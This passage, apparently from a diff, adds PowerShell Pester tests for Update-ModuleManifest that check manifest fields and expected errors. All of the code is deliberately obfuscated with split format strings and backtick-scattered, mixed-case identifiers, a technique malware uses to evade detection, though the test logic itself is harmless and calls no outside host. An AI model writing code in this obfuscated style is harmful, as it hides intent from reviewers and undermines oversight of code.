+        ${Par`AM`SV3}.("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}{2}" -f 'n','HelpI','foURI'),${H`ElPI`NF`OURi})
+        ${pA`Ra`Ms`V3}.("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}"-f'h','Pat'),${S`CR`IPT:tEst`MA`N`iFEstp`ATH})
+        ${PaRA`MSv3}.("{0}{1}" -f'Ad','d').Invoke(("{1}{2}{4}{0}{3}{5}"-f 'Depen','E','xterna','denci','lModule','es'),${eXtER`NAL`ModU`leDepen`D`E`NcI`ES})
+
+        ${pa`R`Am`sV5}= ${pA`RaMs`V3}.("{0}{1}" -f'Clo','ne').Invoke()
+        ${PAr`AMSv5}.("{0}{1}"-f'Ad','d').Invoke(("{1}{0}" -f 'gs','Ta'),${TA`gs})
+        ${PAr`AM`s`V5}.("{1}{0}"-f 'dd','A').Invoke(("{0}{2}{1}"-f'Projec','ri','tU'),${p`R`O`jecturI})
+        ${pA`R`AmsV5}.("{1}{0}"-f'd','Ad').Invoke(("{2}{3}{1}{0}"-f 'ri','eU','Licen','s'),${LI`C`eNsEuri})
+        ${pa`RAM`sV5}.("{0}{1}"-f 'A','dd').Invoke(("{0}{1}"-f 'Ic','onUri'),${I`CO`NurI})
+        ${Pa`RAMs`V5}.("{1}{0}" -f'd','Ad').Invoke(("{1}{2}{0}{3}" -f'eN','R','eleas','otes'),${REl`e`A`SEN`oTES})
+
+        if((${pSV`ers`IO`NTable}."pSverS`i`ON" -ge ("{0}{1}"-f'3.0.','0')) -or (${p`S`VerS`ioNtabLe}."v`erSioN" -le ("{0}{1}" -f'4.0','.0')))
+        {
+            &("{2}{4}{3}{1}{0}"-f'fest','i','New','uleMan','-Mod')  -path ${SC`Rip`T:TEsT`manifE`s`TP`ATh} -Confirm:${f`AlsE} 
+            &("{2}{3}{1}{4}{0}"-f 'fest','Modul','Upda','te-','eMani') @ParamsV3 -Confirm:${f`Al`SE}
+        }
+        elseif(${Ps`VE`RsIoNTA`B`lE}."P`Sv`ERSi`On" -ge ("{0}{1}"-f'5.0.','0'))
+        {
+            &("{1}{4}{2}{0}{5}{3}" -f 'f','New-M','eMani','t','odul','es')  -path ${SC`Ript:T`EstmaN`I`FEStpatH} -Confirm:${fA`L`sE} 
+            &("{1}{2}{3}{0}{5}{4}" -f 'anife','Up','dat','e-ModuleM','t','s') @ParamsV5 -Confirm:${FAl`Se}
+        }
+        ${N`e`WMoDUle`I`NFO} = &("{1}{4}{3}{0}{2}" -f'if','Test-','est','duleMan','Mo') -Path ${SCRIP`T:`TESTm`AnI`FeS`T`PaTH}
+
+        &("{3}{0}{2}{1}" -f 'ssert','s','Equal','A') ${new`MO`D`ULEIn`FO}."gu`id" ${gu`iD} "Guid should be $($Guid) "
+        &("{3}{1}{2}{0}" -f 'ls','Equ','a','Assert') ${neWMo`dUlei`Nfo}."Auth`OR" ${AUT`HOr} "Author name should be $($Author) "
+        &("{0}{1}{2}{3}" -f 'A','s','sertEq','uals') ${New`moDUL`e`i`NFO}."CO`MP`ANYN`AmE" ${CoMp`Any`NA`Me} "Company name should be $($CompanyName) "
+        &("{2}{1}{0}{3}"-f'ual','ertEq','Ass','s') ${n`ewM`OduLeinFO}."c`op`yRIGHT" ${CoP`yr`IgHt} "Copyright should be $($CopyRight) "
+        &("{1}{3}{0}{2}" -f 'qual','A','s','ssertE') ${NE`wmoduLeI`Nfo}."ROot`ModU`le" ${ro`OTmO`Du`LE} "RootModule should be $($RootModule) "
+        &("{3}{2}{0}{1}" -f 'E','quals','ssert','A') ${nE`wmod`ULEinfo}."Vers`iOn"."MA`JOr" ${vER`Si`oN} "Module version should be $($Version) "
+        &("{1}{2}{3}{0}"-f'Equals','A','ss','ert') ${N`EWmodULEin`Fo}."dEsc`Ri`PT`ion" ${d`ES`CriPTi`ON} "Description should be $($Description) "
+        &("{1}{0}{2}" -f'rtE','Asse','quals') ${n`ew`MO`D`UlEinfo}."pr`ocEssORAR`C`H`iTECTUre" ${pro`ce`Ss`ORaR`C`H`iteCTure} "Processor architecture name should be $($ProcessorArchitecture) "
+        &("{1}{2}{0}" -f 'uals','A','ssertEq') ${new`M`Odu`LeInfO}."Cl`Rve`Rs`ion" ${c`L`RvERsIon} "ClrVersion should be $($ClrVersion) "
+        &("{1}{2}{0}{3}"-f'tEqua','As','ser','ls') ${n`e`WmoDUL`EiNFo}."d`O`TN`ET`FRAm`eWoRkVERSioN" ${doTnEt`Fr`A`mEW`oRKVErsi`On} "Dot Net Framework version should be $($DotNetFrameworkVersion) "
+        &("{0}{1}{2}"-f 'Asser','tEq','uals') ${Ne`w`MO`dUlEiNFO}."p`oWERsHEll`HOStvE`R`si`ON" ${Po`w`ErshE`LLHOsT`VERs`iON} "PowerShell Host Version should be $($PowerShellHostVersion) "
+        &("{2}{0}{3}{1}" -f 'ssert','s','A','Equal') ${NewM`oDUl`e`inFO}."rEQ`Uir`ED`As`SEmb`lIEs" ${REq`Ui`Re`D`Assem`BLIES} "RequiredAssemblies should be $($RequiredAssemblies) "
+        &("{1}{2}{0}"-f 'tEquals','Ass','er') ${N`EW`mOdul`EInFO}."POwE`RSHElL`H`o`sTVEr`sioN" ${P`Ow`ersHE`llHo`StvE`RSIOn} "PowerShell Host Version should be $($PowerShellHostVersion) "
+        &("{0}{1}"-f 'Asse','rt') (${n`eWmOdU`lei`Nfo}."mO`DulEl`isT"."na`mE" -contains ${M`oDUlE`lIsT}[0]) "Module List should include $($ModuleList[0]) "
+        &("{2}{0}{1}"-f'er','t','Ass') (${N`ewMODu`L`EiN`FO}."EXp`ort`EDfUnc`TIO`NS"."k`eYS" -contains ${FUn`ctio`N`sTOE`XpORT}[0]) "ExportedFunctions should include $($FunctionsToExport[0]) "
+        &("{1}{0}"-f 'ert','Ass') (${nE`Wm`ODULE`iN`Fo}."eXP`ORteDfU`N`C`TIOnS"."ke`yS" -contains ${fUNCTi`ONst`O`eX`poRT}[1]) "ExportedFunctions should include $($FunctionsToExport[1]) "
+        &("{1}{0}" -f'ert','Ass') (${neWmo`D`UlEIN`FO}."eX`p`oRTeDAl`Ia`seS"."K`eyS" -contains ${AL`iases`ToeXpORt}[0]) "ExportedAliases should include $($AliasesToExport[0]) "
+        &("{1}{0}"-f 'rt','Asse') (${nEWmO`DuLEIn`Fo}."E`Xpo`RteDaLI`ASEs"."kE`ys" -contains ${aL`I`ASESToe`Xp`orT}[1]) "ExportedAliases should include $($AliasesToExport[1]) "
+        &("{0}{1}" -f'As','sert') (${N`EW`m`ODuleIN`Fo}."Exp`Or`TEd`Va`RIAbLeS"."KE`Ys" -contains ${va`RIABLe`S`ToeXPORt}[0]) "ExportedVariables should include $($VariablesToExport[0]) "
+        &("{0}{1}" -f 'As','sert') (${Ne`wM`oDULEInFO}."ExP`oRT`eDV`ARI`A`BlEs"."KE`yS" -contains ${v`Aria`BleSTOe`x`poRt}[1]) "ExportedVariables should include $($VariablesToExport[1]) "
+        &("{0}{1}" -f 'Ass','ert') (${ne`WmO`DuleIn`FO}."EXPO`R`TEd`Cm`dlEts"."kE`YS" -contains (${CMD`Let`sT`OE`XPORt}[0])) "CmdletsToExport should contain $($CmdletsToExport[0]) "
+        &("{0}{1}" -f 'Asse','rt') (${NeW`mo`D`UleiNfO}."e`Xport`ed`CMdLEts"."Ke`ys" -contains (${cM`D`L`ETSTOEXp`ORT}[1])) "CmdletsToExport should contain $($CmdletsToExport[1]) "
+        if(${pSVE`RsI`on`TabLe}."v`ERsi`ON" -gt ("{1}{0}"-f'0.0','5.'))
+        {
+            &("{0}{1}"-f 'As','sert') (${new`Mod`UlEinFo}."t`Ags" -contains ${t`AGs}[0]) "Tags should include $($Tags[0]) "
+            &("{1}{0}"-f 't','Asser') (${NE`wmod`ULEIN`FO}."t`AgS" -contains ${Ta`Gs}[1]) "Tags should include $($Tags[1]) "
+            &("{2}{0}{1}"-f 'ertEq','uals','Ass') ${n`EwM`O`DULEinFo}."PrO`JecTU`Ri" ${P`ROJEctu`RI} "ProjectUri should be $($ProjectUri) "
+            &("{1}{0}{2}"-f'ertE','Ass','quals') ${Ne`WmO`DU`LeInfO}."LICe`Nse`U`Ri" ${Lic`Ense`U`RI} "LicenseUri should be $($LicenseUri) "
+            &("{1}{0}{3}{2}" -f 's','A','ls','sertEqua') ${N`EwMOD`UL`eIN`FO}."Ic`On`URi" ${Ic`O`NUri} "IconUri should be $($IconUri) "
+            &("{3}{1}{2}{0}"-f'rtEquals','ss','e','A') ${nEwm`O`d`ULeINFo}."rEL`eaSENOT`eS" ${RE`lEasENOT`es} "ReleaseNotes should be $($ReleaseNotes) "
+        }
+       
+        ${N`Ew`MODU`leiN`FO}."HelP`i`NFou`RI" | &("{1}{0}"-f 'uld','Sho') ('Be') ${HeLp`i`NFoURI}
+        &("{0}{1}"-f'Asser','t') (${n`EWmoD`Ul`eINfo}."PR`iv`ATEdata"."p`sdA`Ta"."EXTE`R`NAlm`oDu`led`E`pENdeNCieS" -contains ${Ex`TEr`N`A`lmODULedE`pENd`enCIes}[0]) "ExternalModuleDependencies should include $($ExternalModuleDependencies[0]) "
+        &("{1}{0}"-f 'sert','As') (${n`eWMod`U`le`iNFo}."P`R`iVATEdA`TA"."p`sdATA"."E`XTern`AlmoD`UL`edEpen`dencIeS" -contains ${Ext`Er`NAlMO`D`UL`eD`ep`enDENcI`es}[1]) "ExternalModuleDependencies should include $($ExternalModuleDependencies[1]) "
+    } `
+    -Skip:$(${i`SWi`ND`Ows} -eq ${FaL`sE}) 
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{5}{2}{7}{4}{0}{8}{9}{1}{3}{6}" -f'anife','rivat','d','aD','duleM','Up','ata','ateMo','stW','ithP') {
+        
+        &("{1}{2}{0}"-f 'nt','Set-Co','nte') "$script:UpdateModuleManifestBase\$script:UpdateModuleManifestName.psm1" -Value "function Get-$script:UpdateModuleManifestName { Get-Date }"
+
+        ${Priv`A`TEDATa} = @{}
+        ${TA`gs} = ("{1}{0}"-f 's1','Tag'),("{0}{1}"-f'Tag','s2')
+        ${P`R`ojeCtUrI} = "https://$script:UpdateModuleManifestName.com/Project"
+        ${i`c`ONurI} = "https://$script:UpdateModuleManifestName.com/Icon"
+        ${LicE`N`s`EuRI} = "https://$script:UpdateModuleManifestName.com/license"
+        ${R`elea`sEN`oTes} = ("{2}{0}{1}" -f'leaseNo','tes','Re')
+        ${p`AC`KageManAGeM`E`NtP`Ro`VIDErs} = "$script:UpdateModuleManifestName.psm1"
+        ${exTra`pROp`Er`T`ieS} = ("{1}{0}" -f'a','Extr')
+        ${P`RIv`ATeDA`TA}.("{0}{1}"-f'Ad','d').Invoke(("{4}{1}{3}{0}{2}" -f 'i','Pr','es','opert','Extra'),${Ext`RApro`perti`ES})
+
+        &("{2}{1}{4}{3}{0}"-f'st','w-','Ne','eManife','Modul') -path ${SCri`pt:`TEsTMan`I`F`E`St`pAth}
+        &("{3}{1}{2}{4}{0}"-f'nifest','Modul','e','Update-','Ma') -Path ${s`c`Rip`T:teS`TMan`if`EsTPAth} -PrivateData ${PR`ivat`e`data} -Tags ${Ta`GS} `
+        -ProjectUri ${pR`oj`EcT`URI} -IconUri ${Icon`U`Ri} -LicenseUri ${LIceN`SE`URi} -ReleaseNotes ${RelE`ASE`NotES} `
+        -PackageManagementProviders ${pACKa`G`Eman`Age`M`e`NtprOvI`ders} -Confirm:${FA`LsE}
+        
+        ${nEwm`O`dUL`eI`NfO} = &("{4}{3}{1}{5}{0}{2}" -f 'if','dule','est','est-Mo','T','Man') -Path ${s`CrIPt:T`E`sTMaNife`stPaTH}
+
+        if(${Psv`erSIoNta`Ble}."pSveRsI`On" -ge ("{0}{1}"-f'5.','0.0'))
+        {
+            &("{1}{0}{2}" -f'r','Asse','t') (${N`ewmOdulE`I`NfO}."TA`gs" -contains ${ta`gs}[0]) "Tags should include $($Tags[0]) "
+            &("{0}{1}" -f'A','ssert') (${newm`o`DUleinfO}."t`AGs" -contains ${t`AGs}[1]) "Tags should include $($Tags[1]) "
+            &("{2}{1}{0}"-f'als','Equ','Assert') ${n`eWmod`U`LeINfO}."p`ROjEC`TUri" ${P`R`OJEctuRI} "ProjectUri should be $($ProjectUri) "
+            &("{2}{1}{0}{3}"-f 'E','ssert','A','quals') ${N`eWMOD`UlEIn`Fo}."LIcEN`sE`UrI" ${l`Ice`NsEuri} "LicenseUri should be $($LicenseUri) "
+            &("{3}{1}{2}{0}" -f 'uals','s','ertEq','As') ${Ne`Wm`ODU`lE`inFo}."ICoN`UrI" ${iC`ON`Uri} "IconUri should be $($IconUri) "
+            &("{2}{3}{0}{1}" -f'qu','als','A','ssertE') ${n`EwMODuLE`I`Nfo}."R`ELEA`sEN`oTeS" ${RE`LEas`e`No`TES} "ReleaseNotes should be $($ReleaseNotes) "
+
+        }
+        &("{2}{3}{1}{0}"-f 'ls','qua','As','sertE') ${ne`wm`oDU`LeiNFO}."pr`I`VaTed`ATA"."pAC`Kag`eMANA`g`e`mEntpRO`ViDE`RS" ${PAcKaG`E`manaGe`mEntP`RoVI`dE`RS} "PackageManagementProviders should be $($PackageManagementProviders) "
+        &("{2}{0}{1}"-f's','sertEquals','A') ${N`ew`ModULE`INFO}."pRiV`ATE`Data"."ex`TRAPRope`RTIEs" ${eXt`RApr`OP`er`TIES} "ExtraProperties should include $($ExtraProperties) "
+    } 
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{13}{10}{2}{7}{14}{19}{6}{9}{20}{17}{8}{1}{12}{15}{21}{22}{11}{0}{5}{16}{18}{3}" -f 'tP','eMa','stW','rs','U','r','leDepen','ithEx','ag','d','uleManife','n','n','pdateMod','ternal','a','ov','k','ide','Modu','enciesAndPac','g','eme') {
+
+        &("{2}{0}{1}" -f '-Conten','t','Set') "$script:UpdateModuleManifestBase\$script:UpdateModuleManifestName.psm1" -Value "function Get-$script:UpdateModuleManifestName { Get-Date }"
+        &("{2}{1}{0}" -f 'tent','Con','Set-') "$script:UpdateModuleManifestBase/Dependency.psm1" -Value "function Get-$script:UpdateModuleManifestName { Get-Date }"
+
+        ${NeST`Ed`M`oDuLES} = "$script:UpdateModuleManifestBase/Dependency.psm1"
+        ${EXtERnalModUlEdE`p`eNd`ENc`iES} = "$script:UpdateModuleManifestBase/Dependency.psm1"
+        ${packa`Ge`man`AgEMe`NT`PR`oviDErs} = ("{7}{4}{6}{0}{1}{2}{5}{3}" -f'ubl','ishMod','ule','m1','to','.ps','soP','Con')
+
+        &("{0}{2}{3}{1}" -f 'New-Modul','anifest','e','M') -path ${SCR`i`Pt:TE`S`T`MAniFE`STp`Ath} -NestedModules ${Ne`s`TEDMo`dUl`es}
+        &("{4}{2}{3}{1}{0}" -f 'st','ife','pdate-Modu','leMan','U') -Path ${Scr`I`pt:Te`sTMA`NIfe`StPatH} -ExternalModuleDependencies ${extE`RNalm`odulED`E`Pend`enc`Ies} -PackageManagementProviders ${PAcKag`EM`Ana`G`eM`e`NTPROVIdERS} -Confirm:${FA`LsE}
+        ${n`e`WMODulEIN`FO} = &("{3}{0}{2}{1}{4}{5}"-f'oduleM','n','a','Test-M','if','est') -Path ${s`CRipt:tesTma`NiF`eSt`pAtH}
+
+        &("{2}{1}{0}" -f'ertEquals','s','As') ${n`ewm`o`DuLe`iNfO}."pRI`VAteD`A`Ta"."PA`c`KaGEmAna`GeMeNTPrOvI`De`Rs" ${PACKa`g`emA`NagEmenT`P`RO`Vi`D`ers} "PackageManagementProviders should be $($PackageManagementProviders) "
+        &("{0}{2}{1}" -f 'As','ertEquals','s') ${n`eWM`Od`ULEin`FO}."pRiVA`T`ed`AtA"."p`SDAta"."EXterNal`m`OdU`LEDePEnDEN`c`iEs" ${exTEr`NaL`mod`U`LeDEpENdENCies} "ExternalModuleDependencies should include $($ExternalModuleDependencies) "
+    } 
+
+
+
+    
+    
+    
+    
+    
+    
+    
+     &('It') ("{8}{16}{4}{2}{10}{14}{9}{1}{7}{3}{6}{11}{17}{13}{12}{0}{15}{5}" -f'w','o','Ma','e','dule','ion','dDS','rt','Upd','xp','nifesWi','CRes','Lo','In','thE','erPowerShellVers','ateMo','ources') {
+        
+        if(${P`Sver`SiOnTa`BlE}."pSVeRs`Ion" -lt ("{0}{1}" -f'5','.0.0'))
+        {
+            ${dScR`eS`ourCE`St`oeXp`orT} = ("{0}{1}{4}{3}{2}" -f'Ex','por','urce1','scReso','tedD')
+
+            &("{1}{2}{0}{5}{3}{4}"-f'uleM','New-M','od','ifes','t','an') -path ${sc`Ript`:T`eSTmAn`iFe`S`TPaTH}
+
+            &("{5}{0}{2}{4}{3}{1}" -f 'ssert','IdEquals','Ful','r','lyQualifiedErro','A') -scriptblock {&("{1}{2}{3}{0}{5}{4}" -f'-Modu','Upd','at','e','t','leManifes') -Path ${Scri`Pt`:T`eStMA`Ni`FEsTPATh} `
+                                              -DscResourcesToExport ${dscrEs`our`cE`STO`ExP`OrT} } `
+                                              -expectedFullyQualifiedErrorId ("{13}{11}{2}{15}{4}{8}{6}{14}{12}{0}{1}{10}{3}{9}{7}{5}" -f 'd,','Up','orte','Mod','urcesN','nifest','t','leMa','o','u','date-','xp','orte','E','Supp','dDscReso')
+        }
+
+        
+        else
+        {
+            ${POW`ErsH`ell`Ve`RSIOn} = "3.0"
+            ${dSC`R`E`SOUR`c`EsTOeXPOrt} = ("{4}{3}{5}{2}{0}{1}" -f'urce','1','o','ortedDsc','Exp','Res')
+
+            &("{0}{2}{3}{4}{1}" -f 'New-Mod','st','u','leManif','e') -path ${sCrIPT:tes`TMA`N`iFEs`TPAtH}
+
+            &("{0}{4}{2}{3}{5}{1}"-f'AssertF','orIdEquals','alifie','d','ullyQu','Err') -scriptblock {&("{5}{4}{3}{2}{0}{6}{1}"-f 'Manif','st','le','-Modu','te','Upda','e') -Path ${scRIpt:`TeS`Tm`A`N`ifeST`paTH} -PowerShellVersion ${p`oW`ErShElLvER`SiON} `
+                                              -DscResourcesToExport ${dscr`eso`Urc`ES`TOe`X`POrT} } `
+                                              -expectedFullyQualifiedErrorId ("{5}{10}{13}{8}{9}{4}{7}{12}{14}{0}{6}{2}{1}{11}{3}"-f'p','l','e-Modu','anifest','ot','Expo','orted,Updat','S','o','urcesN','r','eM','u','tedDscRes','p')
+        }
+    } 
+
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{12}{7}{10}{2}{4}{5}{8}{6}{9}{0}{3}{1}{11}"-f 'idExp','esourc','o','ortedDSCR','dul','eManifes','W','pda','t','ithVal','teM','es','U') {
+        ${DsCRESou`RCe`s`TOexp`OrT} = ("{4}{5}{2}{6}{3}{0}{1}"-f 'so','urce1','e','scRe','Exp','ort','dD'), ("{5}{4}{2}{3}{1}{0}{6}" -f'cRes','dDs','or','te','p','Ex','ources2')
+        &("{1}{3}{2}{0}{4}"-f'leMan','Ne','Modu','w-','ifest') -path ${S`CRiPT`:tesTmAN`if`estpaTh} -PowerShellVersion 5.0
+        &("{3}{4}{1}{0}{2}{5}"-f 'uleMani','-Mod','f','Up','date','est') -Path ${S`cRiPT:`Te`stManife`sTpATH} -DscResourcesToExport ${DS`CrE`s`OuRCe`sToEXpO`Rt} -Confirm:${f`AL`se}
+
+        ${nE`wm`oDU`LeInfO} = &("{1}{0}{4}{2}{3}"-f 'st-Mod','Te','an','ifest','uleM') -Path ${Sc`R`IpT:t`es`TM`An`IFEsTPath}
+
+        &("{1}{0}"-f'ert','Ass') (${NewMO`DUlEI`NFo}."exPO`Rte`DDScR`eSOURcES" -contains ${dSCR`eSOUr`C`eST`OeXpoRT}[0]) "DscResourcesToExport should include $($DscResourcesToExport[0]) "
+        &("{1}{0}" -f't','Asser') (${n`eWmodUl`ei`NFO}."expORte`dDscReSouR`C`es" -contains ${D`scr`eS`OuRcEstO`ExpOrt}[1]) "DscResourcesToExport should include $($DscResourcesToExport[1]) "
+        
+    } `
+    -Skip:$((${pSVersI`oNT`AbLe}."P`SVeRSIon" -lt ("{1}{0}"-f '.0','5.0')) -or (${psVe`RS`IO`NTA`Ble}."psveRS`ioN" -ge ("{0}{1}" -f '6.0.','9')))
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{0}{6}{7}{8}{3}{9}{4}{10}{2}{1}{5}" -f 'Up','uleDependen','validExternalMod','u','estWi','cies','d','ateMo','d','leManif','thIn') {
+        ${NesTedMOD`Ul`Es} = ("{3}{2}{0}{1}"-f'le','s','du','NestedMo')
+        ${extE`RNA`LM`oduleD`e`P`EnD`en`ceS} = ("{3}{0}{1}{2}" -f't','raM','odules','Ex')
+
+        &("{4}{1}{2}{3}{0}" -f 'est','-ModuleMa','ni','f','New') -path ${SCR`IPt:t`ESTmaN`ifEsTP`ATH}
+
+        &("{0}{9}{1}{3}{7}{2}{4}{5}{8}{6}" -f 'As','rtFu','alif','llyQ','i','edErro','Equals','u','rId','se') -scriptblock {&("{5}{4}{6}{2}{3}{1}{0}" -f'fest','i','leM','an','pdate','U','-Modu') -Path ${sCripT`:T`esTm`ANi`FESt`Path} -NestedModules ${N`e`s`TEdmoDul`ES} `
+                                          -ExternalModuleDependencies ${ex`TeRna`LM`Od`U`ledEPenD`encES} -Confirm:${FA`LSe} } `
+                                          -expectedFullyQualifiedErrorId ("{11}{9}{7}{2}{3}{4}{0}{6}{10}{5}{8}{1}"-f 'denci','est','ternalMo','dul','eDepen','-Module','es,Upda','lidEx','Manif','a','te','Inv')
+    } 
+
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{6}{10}{2}{9}{4}{7}{0}{3}{8}{5}"-f'i','Up','Ma','fest','stWithInva','th','dat','lidModuleMan','Pa','nife','eModule') {
+        ${PA`TH} = ("{3}{1}{0}{2}" -f'l','/Inva','idPath','/')
+
+        &("{5}{4}{6}{0}{2}{1}{3}{8}{7}"-f 'a','f','li','iedErrorIdEqua','sertFul','As','lyQu','s','l') -scriptblock {&("{0}{2}{5}{1}{3}{4}" -f'Up','ModuleMa','dat','nif','est','e-') -Path ${p`Ath}} `
+                                          -expectedFullyQualifiedErrorId ("{3}{1}{8}{11}{10}{13}{5}{4}{2}{9}{12}{7}{14}{6}{0}" -f'duleManifest','al','t','Inv','lePa','tFi','o','-','idM','h,','uleMa','od','Update','nifes','M')
+    } 
+    
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{6}{4}{7}{5}{3}{2}{0}{1}"-f 'thI','nvalidFileList','stWi','anife','teMo','uleM','Upda','d') {
+        ${FIL`Ep`Ath} = ("{0}{2}{3}{1}"-f'ab','.ps1','c','defg')
+        &("{1}{2}{3}{0}{4}" -f 'uleManifes','New','-Mo','d','t') -path ${Sc`RIPt`:teS`TM`AnifesTpATh} -FileList ${fiLE`p`Ath}
+
+        
+        if(${pS`V`ErS`IontAB`LE}."PSV`e`Rsi`on" -lt ("{1}{0}" -f '.0','5.1'))
+        {
+            &("{5}{2}{0}{6}{1}{3}{4}" -f 'rorId','ua','lyQualifiedEr','l','s','AssertFul','Eq') -scriptblock {&("{0}{2}{3}{1}{4}" -f 'Update-','Manif','Mod','ule','est') -Path ${scr`I`pT:TEST`mAN`iFEsTPATh}} `
+                                          -expectedFullyQualifiedErrorId ("{4}{7}{9}{2}{1}{6}{5}{0}{8}{3}" -f 'dat','eLis','nFil','st','FileP','thinModuleBase,Up','tNotWi','ath','e-ModuleManife','I')
+        }
+        else
+        {
+            &("{3}{7}{4}{6}{8}{9}{1}{5}{0}{2}" -f'dEqual','e','s','Assert','lly','dErrorI','Qu','Fu','alif','i') -scriptblock {&("{6}{0}{1}{2}{4}{3}{5}" -f 'da','te','-M','eManifes','odul','t','Up') -Path ${script:t`ES`T`maNifes`T`PaTh}} `
+                                          -expectedFullyQualifiedErrorId ("{6}{0}{3}{1}{5}{7}{2}{4}"-f 'nva','i','te-ModuleMa','l','nifest','dModuleManifes','I','tFile,Upda')
+        }
+        
+    } 
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{9}{0}{7}{11}{4}{6}{10}{8}{2}{3}{5}"-f 'n','UpdateM','ile','Lis','th','t2','Inv','ifestW','dF','oduleMa','ali','i') {
+        &("{1}{4}{0}{3}{2}{5}"-f'odu','N','anifes','leM','ew-M','t') -path ${ScRi`p`T:tEStM`A`N`IFESTP`AtH}
+        ${fI`l`EPaTh} = &("{2}{1}{0}"-f 'ath','in-P','Jo') ${SCRi`pT:psgeT`mODUL`ein`FO}."M`O`DUlEbAse" ("{2}{0}{1}" -f'f','g.ps1','abcde')
+        &("{0}{2}{3}{4}{1}{6}{5}" -f'Asse','r','rtF','ullyQu','alifiedE','ls','rorIdEqua') -scriptblock {&("{4}{2}{6}{1}{5}{0}{3}"-f 'a','u','-','nifest','Update','leM','Mod') -Path ${scrIp`T:T`Es`TMa`NIfestPAtH} -FileList ${FIlePA`TH}} `
+                                          -expectedFullyQualifiedErrorId ("{10}{3}{12}{11}{6}{0}{5}{4}{7}{8}{9}{1}{2}" -f 'Wi','fe','st','PathIn','nMod','thi','tNot','uleBase,U','pdate','-ModuleMani','File','ileLis','F')
+    } 
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{1}{12}{5}{11}{4}{0}{9}{8}{6}{2}{7}{10}" -f'dule','pd','ti','U','festWithInvalidMo','o','per','e','o','Pr','s','duleMani','ateM') {
+
+        ${n`e`STED`MOD`ULeS} = @(("{0}{1}"-f'Ne','sted'),@{("{1}{3}{0}{2}{4}" -f'V','Modul','ers','e','ion')="1.0"})
+
+        &("{1}{4}{0}{3}{2}{5}"-f 'd','N','fes','uleMani','ew-Mo','t') -path ${S`C`RI`Pt:Testm`AniFeSTPath}
+        &("{6}{7}{1}{8}{5}{2}{0}{3}{4}"-f 'edEr','ly','ifi','rorIdEqu','als','l','A','ssertFul','Qua') -scriptblock {&("{1}{3}{2}{4}{0}" -f 'ifest','Up','-Mo','date','duleMan') -Path ${scrI`PT`:TE`sTM`ANifEs`TP`ATh} -NestedModules ${N`e`STeDmODUl`Es}} `
+                                          -expectedFullyQualifiedErrorId ("{1}{4}{0}{9}{5}{2}{6}{10}{8}{3}{12}{7}{11}{13}"-f'l','NewM','il','te-M','odu','ManifestFa','ure,','a','a','e','Upd','ni','oduleM','fest')
+    } 
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{8}{0}{7}{10}{5}{2}{1}{3}{11}{4}{9}{6}"-f'e','ageMa','Pack','nagem','n','alid','viders','ModuleManife','Updat','tPro','stWithInv','e') {
+
+        ${pAckage`m`AnAGeMEnTpRoVI`DE`Rs} = ("{1}{0}{3}{2}"-f 'alidProvi','Inv','s','der')
+
+        &("{4}{3}{1}{2}{0}"-f 'fest','uleM','ani','d','New-Mo') -path ${sC`Ri`pT:tesT`manIfEsT`paTh}
+        &("{1}{3}{5}{6}{7}{4}{0}{2}" -f'Eq','AssertFully','uals','Q','d','ualified','Er','rorI') -scriptblock {&("{0}{2}{3}{1}{4}" -f'Update','uleMan','-Mo','d','ifest') -Path ${SCRipT:`TE`StMA`N`ifes`TpAtH} -PackageManagementProviders ${p`AcK`Ag`ema`NagEmENT`pr`OvId`eRs}} `
+                                          -expectedFullyQualifiedErrorId ("{7}{3}{8}{2}{4}{6}{0}{9}{5}{1}"-f'ovi','t','dPackage','n','ManagementP','rs,Update-ModuleManifes','r','I','vali','de')
+    } 
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{5}{7}{0}{1}{6}{2}{3}" -f'duleManifes','tWithI','oot','Module','Up','dateM','nvalidR','o') {
+
+        &("{1}{3}{5}{4}{2}{0}"-f'st','New','e','-Mod','if','uleMan') -path ${s`crIpt`:Testm`A`NIFEStp`A`TH}
+
+        ${INva`LID`RoO`T`MODuLe} = "\/"
+        &("{3}{2}{5}{7}{4}{0}{6}{1}{8}{9}"-f'Q','ifiedErrorIdEqua','r','Asse','y','tFul','ual','l','l','s') -scriptblock {&("{1}{4}{0}{2}{3}"-f'ate','Up','-ModuleMan','ifest','d') -Path ${sCRIpT:TE`S`TMANI`F`eS`T`pATH} -RootModule ${in`VAL`idrOO`TMo`D`ULe}} `
+                                          -expectedFullyQualifiedErrorId ("{10}{3}{2}{9}{6}{1}{0}{7}{5}{11}{4}{8}"-f'il,Upd','Fa','t','Manifes','uleM','Mo','le','ate-','anifest','Fi','Update','d')
+
+        ${NeW`mOD`UlEi`N`FO} = &("{3}{2}{0}{6}{1}{4}{5}" -f'le','anife','t-Modu','Tes','s','t','M') -Path ${sCrIpt`:TeS`TM`ANife`sTPAth}
+        &("{0}{1}" -f 'Asse','rt') (${neWm`ODul`ei`NFO}."R`ootmO`dulE" -contains ${I`NvaLiDro`OtM`oD`ULE} -eq ${Fa`L`se}) ("{6}{9}{0}{2}{10}{8}{11}{5}{4}{1}{3}{7}"-f 'e M','lid roo','anifest should','t modu','nva','n an i','Modu','le','t con','l',' no','tai')
+    }`
+    -Skip:$(${pS`VE`RSio`NTab`LE}."PsvE`RsiOn" -lt ("{1}{0}" -f'0','5.1.'))
+
+    
+    
+    
+    
+    
+    
+    
+    &('It') ("{2}{5}{9}{10}{0}{1}{3}{7}{6}{4}{8}"-f'ifestWi','th','Update','I','anif','M','lidM','nva','est','oduleM','an') {
+
+        &("{2}{0}{3}{5}{1}{4}" -f '-M','if','New','odu','est','leMan') -path ${scRiP`T:tEStmANi`F`EsTP`A`Th} -TypesToProcess ("{0}{1}"-f'type','s1')
+        &("{5}{1}{3}{4}{2}{0}" -f'Equals','ssertFu','d','llyQual','ifiedErrorI','A') -scriptblock {&("{1}{0}{3}{2}{4}"-f 'pdate-M','U','eManif','odul','est') -Path ${SC`R`ipt`:tE`stmaNif`esTPaTH}} `
